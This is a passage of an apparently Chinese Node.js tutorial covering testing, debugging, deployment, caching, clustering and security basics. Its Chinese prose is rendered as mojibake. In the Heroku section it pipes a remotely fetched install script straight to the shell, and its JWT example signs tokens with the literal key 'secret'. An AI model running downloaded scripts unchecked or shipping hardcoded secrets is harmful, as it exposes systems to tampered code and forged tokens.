class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-router&#x27;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/:id&#x27;</span>, <span class="hljs-title function_">async</span> (ctx) =&gt; &#123;<br>  ctx.<span class="hljs-property">body</span> = <span class="hljs-string">`User ID: <span class="hljs-subst">$&#123;ctx.params.id&#125;</span>`</span>;<br>&#125;);<br><br>app.<span class="hljs-title function_">use</span>(router.<span class="hljs-title function_">routes</span>());<br></code></pre></td></tr></table></figure><hr><h2 id="7-æµ‹è¯•ä¸è°ƒè¯•-1"><a href="#7-æµ‹è¯•ä¸è°ƒè¯•-1" class="headerlink" title="7. æµ‹è¯•ä¸è°ƒè¯•"></a>7. æµ‹è¯•ä¸è°ƒè¯•</h2><p>Node.js æä¾›äº†å¤šç§æµ‹è¯•ä¸è°ƒè¯•å·¥å…·ï¼Œå¸®åŠ©å¼€å‘è€…ç¡®ä¿ä»£ç çš„æ­£ç¡®æ€§å’Œæ€§èƒ½ã€‚</p><h3 id="7-1-å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•"><a href="#7-1-å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•" class="headerlink" title="7.1 å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•"></a>7.1 å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•</h3><p>å•å…ƒæµ‹è¯•æ˜¯ç¡®ä¿å„ä¸ªæ¨¡å—åŠŸèƒ½æ­£å¸¸çš„åŸºæœ¬æ–¹å¼ã€‚<code>Mocha</code> æ˜¯ Node.js ä¸­å¸¸ç”¨çš„æµ‹è¯•æ¡†æ¶ï¼Œé…åˆ <code>Chai</code> è¿›è¡Œæ–­è¨€ã€‚</p><h4 id="7-1-1-ä½¿ç”¨-Mocha-è¿›è¡Œå•å…ƒæµ‹è¯•"><a href="#7-1-1-ä½¿ç”¨-Mocha-è¿›è¡Œå•å…ƒæµ‹è¯•" class="headerlink" title="7.1.1 ä½¿ç”¨ Mocha è¿›è¡Œå•å…ƒæµ‹è¯•"></a>7.1.1 ä½¿ç”¨ Mocha è¿›è¡Œå•å…ƒæµ‹è¯•</h4><p>å®‰è£… <code>Mocha</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save-dev mocha<br></code></pre></td></tr></table></figure><p><strong>ç¼–å†™ç®€å•æµ‹è¯•ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> assert = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;assert&#x27;</span>);<br><br><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Math Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should return the sum of two numbers&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    assert.<span class="hljs-title function_">strictEqual</span>(<span class="hljs-number">1</span> + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>è¿è¡Œæµ‹è¯•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npx mocha<br></code></pre></td></tr></table></figure><h4 id="7-1-2-ä½¿ç”¨-Chai-è¿›è¡Œæ–­è¨€"><a href="#7-1-2-ä½¿ç”¨-Chai-è¿›è¡Œæ–­è¨€" class="headerlink" title="7.1.2 ä½¿ç”¨ Chai è¿›è¡Œæ–­è¨€"></a>7.1.2 ä½¿ç”¨ Chai è¿›è¡Œæ–­è¨€</h4><p>å®‰è£… <code>Chai</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install chai --save-dev<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ <code>Chai</code> è¿›è¡Œæ›´ä¸°å¯Œçš„æ–­è¨€ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> chai = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;chai&#x27;</span>);<br><span class="hljs-keyword">const</span> expect = chai.<span class="hljs-property">expect</span>;<br><br><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Math Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should return the sum of two numbers&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">expect</span>(<span class="hljs-number">1</span> + <span class="hljs-number">1</span>).<span class="hljs-property">to</span>.<span class="hljs-title function_">equal</span>(<span class="hljs-number">2</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="7-1-3-æµ‹è¯•å¼‚æ­¥ä»£ç "><a href="#7-1-3-æµ‹è¯•å¼‚æ­¥ä»£ç " class="headerlink" title="7.1.3 æµ‹è¯•å¼‚æ­¥ä»£ç "></a>7.1.3 æµ‹è¯•å¼‚æ­¥ä»£ç </h4><p>Mocha æ”¯æŒæµ‹è¯•å¼‚æ­¥ä»£ç ï¼Œä½¿ç”¨ <code>done</code> å›è°ƒæˆ–è€… <code>async/await</code>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Async Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should test async code&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-number">42</span>), <span class="hljs-number">100</span>));<br>    <span class="hljs-title function_">expect</span>(result).<span class="hljs-property">to</span>.<span class="hljs-title function_">equal</span>(<span class="hljs-number">42</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="7-2-è°ƒè¯•-Node-js-åº”ç”¨"><a href="#7-2-è°ƒè¯•-Node-js-åº”ç”¨" class="headerlink" title="7.2 è°ƒè¯• Node.js åº”ç”¨"></a>7.2 è°ƒè¯• Node.js åº”ç”¨</h3><h4 id="7-2-1-ä½¿ç”¨-console-log-è°ƒè¯•"><a href="#7-2-1-ä½¿ç”¨-console-log-è°ƒè¯•" class="headerlink" title="7.2.1 ä½¿ç”¨ console.log è°ƒè¯•"></a>7.2.1 ä½¿ç”¨ <code>console.log</code> è°ƒè¯•</h4><p>æœ€ç®€å•çš„è°ƒè¯•æ–¹å¼æ˜¯é€šè¿‡ <code>console.log()</code> è¾“å‡ºå˜é‡å€¼å’Œå‡½æ•°çš„æ‰§è¡Œæƒ…å†µã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Debugging: &#x27;</span>, someVariable);<br></code></pre></td></tr></table></figure><h4 id="7-2-2-ä½¿ç”¨-Node-js-å†…ç½®è°ƒè¯•å™¨"><a href="#7-2-2-ä½¿ç”¨-Node-js-å†…ç½®è°ƒè¯•å™¨" class="headerlink" title="7.2.2 ä½¿ç”¨ Node.js å†…ç½®è°ƒè¯•å™¨"></a>7.2.2 ä½¿ç”¨ <code>Node.js</code> å†…ç½®è°ƒè¯•å™¨</h4><p>Node.js è‡ªå¸¦äº†è°ƒè¯•å™¨ï¼Œå…è®¸å¼€å‘è€…è®¾ç½®æ–­ç‚¹å¹¶é€æ­¥è°ƒè¯•ä»£ç ã€‚</p><p><strong>å¯åŠ¨è°ƒè¯•æ¨¡å¼ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">node inspect app.js<br></code></pre></td></tr></table></figure><h4 id="7-2-3-ä½¿ç”¨-VS-Code-è°ƒè¯•-Node-js-åº”ç”¨"><a href="#7-2-3-ä½¿ç”¨-VS-Code-è°ƒè¯•-Node-js-åº”ç”¨" class="headerlink" title="7.2.3 ä½¿ç”¨ VS Code è°ƒè¯• Node.js åº”ç”¨"></a>7.2.3 ä½¿ç”¨ <code>VS Code</code> è°ƒè¯• Node.js åº”ç”¨</h4><p><code>Visual Studio Code</code> æä¾›äº†å¼ºå¤§çš„è°ƒè¯•å·¥å…·ï¼Œå…è®¸ç›´æ¥åœ¨ç¼–è¾‘å™¨ä¸­è®¾ç½®æ–­ç‚¹å¹¶è¿è¡Œè°ƒè¯•ã€‚</p><p><strong>é…ç½® <code>launch.json</code>ï¼š</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;node&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Launch Program&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;program&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/app.js&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="8-éƒ¨ç½²ä¸æ€§èƒ½ä¼˜åŒ–-1"><a href="#8-éƒ¨ç½²ä¸æ€§èƒ½ä¼˜åŒ–-1" class="headerlink" title="8. éƒ¨ç½²ä¸æ€§èƒ½ä¼˜åŒ–"></a>8. éƒ¨ç½²ä¸æ€§èƒ½ä¼˜åŒ–</h2><p>Node.js åº”ç”¨å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼è¿›è¡Œéƒ¨ç½²ï¼Œå¦‚ä½¿ç”¨ <strong>PM2</strong>ã€<strong>Docker</strong> æˆ–åœ¨ <strong>äº‘å¹³å°</strong> ä¸Šè¿›è¡Œæ‰˜ç®¡ã€‚</p><h3 id="8-1-éƒ¨ç½²-Node-js-åº”ç”¨"><a href="#8-1-éƒ¨ç½²-Node-js-åº”ç”¨" class="headerlink" title="8.1 éƒ¨ç½² Node.js åº”ç”¨"></a>8.1 éƒ¨ç½² Node.js åº”ç”¨</h3><h4 id="8-1-1-ä½¿ç”¨-PM2-è¿›è¡Œè¿›ç¨‹ç®¡ç†"><a href="#8-1-1-ä½¿ç”¨-PM2-è¿›è¡Œè¿›ç¨‹ç®¡ç†" class="headerlink" title="8.1.1 ä½¿ç”¨ PM2 è¿›è¡Œè¿›ç¨‹ç®¡ç†"></a>8.1.1 ä½¿ç”¨ <code>PM2</code> è¿›è¡Œè¿›ç¨‹ç®¡ç†</h4><p><code>PM2</code> æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ Node.js è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œæ”¯æŒè‡ªåŠ¨é‡å¯ã€æ—¥å¿—ç®¡ç†ç­‰åŠŸèƒ½ã€‚</p><p>å®‰è£… <code>PM2</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install pm2 -g<br></code></pre></td></tr></table></figure><p><strong>å¯åŠ¨åº”ç”¨ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pm2 start app.js<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹åº”ç”¨çŠ¶æ€ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pm2 status<br></code></pre></td></tr></table></figure><h4 id="8-1-2-Docker-éƒ¨ç½²-Node-js-åº”ç”¨"><a href="#8-1-2-Docker-éƒ¨ç½²-Node-js-åº”ç”¨" class="headerlink" title="8.1.2 Docker éƒ¨ç½² Node.js åº”ç”¨"></a>8.1.2 Docker éƒ¨ç½² Node.js åº”ç”¨</h4><p><strong>åˆ›å»º <code>Dockerfile</code>ï¼š</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> node:<span class="hljs-number">14</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . .</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> npm install</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;node&quot;</span>, <span class="hljs-string">&quot;app.js&quot;</span>]</span><br></code></pre></td></tr></table></figure><p><strong>æ„å»º Docker é•œåƒå¹¶è¿è¡Œï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t myapp .<br>docker run -p 3000:3000 myapp<br></code></pre></td></tr></table></figure><h4 id="8-1-3-åœ¨äº‘å¹³å°ä¸Šéƒ¨ç½²-Node-js"><a href="#8-1-3-åœ¨äº‘å¹³å°ä¸Šéƒ¨ç½²-Node-js" class="headerlink" title="8.1.3 åœ¨äº‘å¹³å°ä¸Šéƒ¨ç½² Node.js"></a>8.1.3 åœ¨äº‘å¹³å°ä¸Šéƒ¨ç½² Node.js</h4><p>Node.js å¯ä»¥è½»æ¾éƒ¨ç½²åˆ°å„ç§äº‘å¹³å°ï¼Œå¦‚ AWSã€Herokuã€Google Cloud ç­‰ã€‚</p><p><strong>Heroku éƒ¨ç½²æ­¥éª¤ï¼š</strong></p><ol><li><p>å®‰è£… Heroku CLIï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://cli-assets.heroku.com/install.sh | sh<br></code></pre></td></tr></table></figure></li><li><p>ç™»å½• Herokuï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">heroku login<br></code></pre></td></tr></table></figure></li><li><p>éƒ¨ç½²åº”ç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">heroku create<br>git push heroku master<br></code></pre></td></tr></table></figure></li></ol><h3 id="8-2-æ€§èƒ½ä¼˜åŒ–ä¸ç¼“å­˜"><a href="#8-2-æ€§èƒ½ä¼˜åŒ–ä¸ç¼“å­˜" class="headerlink" title="8.2 æ€§èƒ½ä¼˜åŒ–ä¸ç¼“å­˜"></a>8.2 æ€§èƒ½ä¼˜åŒ–ä¸ç¼“å­˜</h3><h4 id="8-2-1-ä½¿ç”¨-Redis-ç¼“å­˜"><a href="#8-2-1-ä½¿ç”¨-Redis-ç¼“å­˜" class="headerlink" title="8.2.1 ä½¿ç”¨ Redis ç¼“å­˜"></a>8.2.1 ä½¿ç”¨ Redis ç¼“å­˜</h4><p>Redis æ˜¯ä¸€ç§å†…å­˜æ•°æ®ç»“æ„å­˜å‚¨ï¼Œå¸¸ç”¨äºç¼“å­˜æ•°æ®ä»¥å‡å°‘æ•°æ®åº“å‹åŠ›ã€‚</p><p>å®‰è£… Redis å®¢æˆ·ç«¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install redis<br></code></pre></td></tr></table></figure><p><strong>è¿æ¥ Redis å¹¶è®¾ç½®ç¼“å­˜ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> redis = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;redis&#x27;</span>);<br><span class="hljs-keyword">const</span> client = redis.<span class="hljs-title function_">createClient</span>();<br><br>client.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, redis.<span class="hljs-property">print</span>);<br>client.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, reply</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(reply);  <span class="hljs-comment">// è¾“å‡º: value</span><br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="8-2-2-å†…å­˜ä¼˜åŒ–ä¸åƒåœ¾å›æ”¶"><a href="#8-2-2-å†…å­˜ä¼˜åŒ–ä¸åƒåœ¾å›æ”¶" class="headerlink" title="8.2.2 å†…å­˜ä¼˜åŒ–ä¸åƒåœ¾å›æ”¶"></a>8.2.2 å†…å­˜ä¼˜åŒ–ä¸åƒåœ¾å›æ”¶</h4><p>Node.js æ˜¯åŸºäº V8 å¼•æ“çš„ï¼ŒV8 è‡ªå¸¦äº†åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œä½†åœ¨å¤§æ•°æ®å¤„ç†æ—¶éœ€è¦æ³¨æ„å†…å­˜ç®¡ç†ã€‚</p><p><strong>æ£€æµ‹å†…å­˜ä½¿ç”¨æƒ…å†µï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(process.<span class="hljs-title function_">memoryUsage</span>());<br></code></pre></td></tr></table></figure><h4 id="8-2-3-ä½¿ç”¨é›†ç¾¤æ¨¡å¼æé«˜æ€§èƒ½"><a href="#8-2-3-ä½¿ç”¨é›†ç¾¤æ¨¡å¼æé«˜æ€§èƒ½" class="headerlink" title="8.2.3 ä½¿ç”¨é›†ç¾¤æ¨¡å¼æé«˜æ€§èƒ½"></a>8.2.3 ä½¿ç”¨é›†ç¾¤æ¨¡å¼æé«˜æ€§èƒ½</h4><p>Node.js å•çº¿ç¨‹æ¨¡å‹å¯ä»¥é€šè¿‡ <strong>Cluster æ¨¡å¼</strong> åˆ©ç”¨å¤šæ ¸ CPU æé«˜æ€§èƒ½ã€‚</p><p><strong>ä½¿ç”¨ <code>cluster</code> æ¨¡å—åˆ›å»ºå¤šè¿›ç¨‹ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> cluster = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cluster&#x27;</span>);<br><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;os&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (cluster.<span class="hljs-property">isMaster</span>) &#123;<br>  <span class="hljs-keyword">const</span> numCPUs = os.<span class="hljs-title function_">cpus</span>().<span class="hljs-property">length</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Master process running, spawning <span class="hljs-subst">$&#123;numCPUs&#125;</span> workers...`</span>);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numCPUs; i++) &#123;<br>    cluster.<span class="hljs-title function_">fork</span>();<br>  &#125;<br>  <br>  cluster.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">worker, code, signal</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Worker <span class="hljs-subst">$&#123;worker.process.pid&#125;</span> died.`</span>);<br>  &#125;);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello from worker\n&#x27;</span>);<br>  &#125;).<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>);<br>  <br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Worker <span class="hljs-subst">$&#123;process.pid&#125;</span> started`</span>);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="9-å®‰å…¨æ€§-1"><a href="#9-å®‰å…¨æ€§-1" class="headerlink" title="9. å®‰å…¨æ€§"></a>9. å®‰å…¨æ€§</h2><p>Node.js çš„å®‰å…¨æ€§åœ¨ Web åº”ç”¨ä¸­è‡³å…³é‡è¦ï¼Œå¸¸è§çš„å¨èƒåŒ…æ‹¬ <strong>æ³¨å…¥æ”»å‡»</strong>ã€<strong>è·¨ç«™è„šæœ¬æ”»å‡» (XSS)</strong> å’Œ <strong>CSRF</strong>ã€‚</p><h3 id="9-1-å®‰å…¨æ€§æœ€ä½³å®è·µ"><a href="#9-1-å®‰å…¨æ€§æœ€ä½³å®è·µ" class="headerlink" title="9.1 å®‰å…¨æ€§æœ€ä½³å®è·µ"></a>9.1 å®‰å…¨æ€§æœ€ä½³å®è·µ</h3><h4 id="9-1-1-é˜²æ­¢æ³¨å…¥æ”»å‡»"><a href="#9-1-1-é˜²æ­¢æ³¨å…¥æ”»å‡»" class="headerlink" title="9.1.1 é˜²æ­¢æ³¨å…¥æ”»å‡»"></a>9.1.1 é˜²æ­¢æ³¨å…¥æ”»å‡»</h4><p>é¿å…ç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢é˜²æ­¢ SQL æ³¨å…¥ã€‚</p><p><strong>ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span>, [userId], <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="9-1-2-é˜²æ­¢è·¨ç«™è„šæœ¬æ”»å‡»-XSS"><a href="#9-1-2-é˜²æ­¢è·¨ç«™è„šæœ¬æ”»å‡»-XSS" class="headerlink" title="9.1.2 é˜²æ­¢è·¨ç«™è„šæœ¬æ”»å‡» (XSS)"></a>9.1.2 é˜²æ­¢è·¨ç«™è„šæœ¬æ”»å‡» (XSS)</h4><p>ä½¿ç”¨è¾“å…¥æ ¡éªŒã€è¾“å‡ºç¼–ç å’Œå®‰å…¨åº“ï¼ˆå¦‚ <code>helmet.js</code>ï¼‰é˜²æ­¢ XSS æ”»å‡»ã€‚</p><p><strong>è¾“å‡ºç¼–ç ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sanitizedData = <span class="hljs-title function_">escapeHtml</span>(userInput);<br></code></pre></td></tr></table></figure><h4 id="9-1-3-ä½¿ç”¨-helmet-js-ä¿æŠ¤åº”ç”¨"><a href="#9-1-3-ä½¿ç”¨-helmet-js-ä¿æŠ¤åº”ç”¨" class="headerlink" title="9.1.3 ä½¿ç”¨ helmet.js ä¿æŠ¤åº”ç”¨"></a>9.1.3 ä½¿ç”¨ <code>helmet.js</code> ä¿æŠ¤åº”ç”¨</h4><p><code>helmet.js</code> æ˜¯ç”¨äºä¿æŠ¤ Express åº”ç”¨çš„å®‰å…¨åº“ã€‚</p><p>å®‰è£… <code>helmet</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install helmet<br></code></pre></td></tr></table></figure><p><strong>åœ¨ Express ä¸­ä½¿ç”¨ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> helmet = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;helmet&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">helmet</span>());<br></code></pre></td></tr></table></figure><h3 id="9-2-èº«ä»½éªŒè¯ä¸æˆæƒ"><a href="#9-2-èº«ä»½éªŒè¯ä¸æˆæƒ" class="headerlink" title="9.2 èº«ä»½éªŒè¯ä¸æˆæƒ"></a>9.2 èº«ä»½éªŒè¯ä¸æˆæƒ</h3><h4 id="9-2-1-ä½¿ç”¨-JWT-è¿›è¡Œèº«ä»½éªŒè¯"><a href="#9-2-1-ä½¿ç”¨-JWT-è¿›è¡Œèº«ä»½éªŒè¯" class="headerlink" title="9.2.1 ä½¿ç”¨ JWT è¿›è¡Œèº«ä»½éªŒè¯"></a>9.2.1 ä½¿ç”¨ JWT è¿›è¡Œèº«ä»½éªŒè¯</h4><p>JWT (JSON Web Token) æ˜¯ä¸€ç§è½»é‡çº§çš„èº«ä»½éªŒè¯æœºåˆ¶ï¼Œé€šå¸¸ç”¨äº</p><p> API èº«ä»½è®¤è¯ã€‚</p><p>å®‰è£… <code>jsonwebtoken</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure><p><strong>ç”Ÿæˆ JWTï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">userId</span>: <span class="hljs-number">123</span> &#125;, <span class="hljs-string">&#x27;secret&#x27;</span>, &#123; <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">&#x27;1h&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><h4 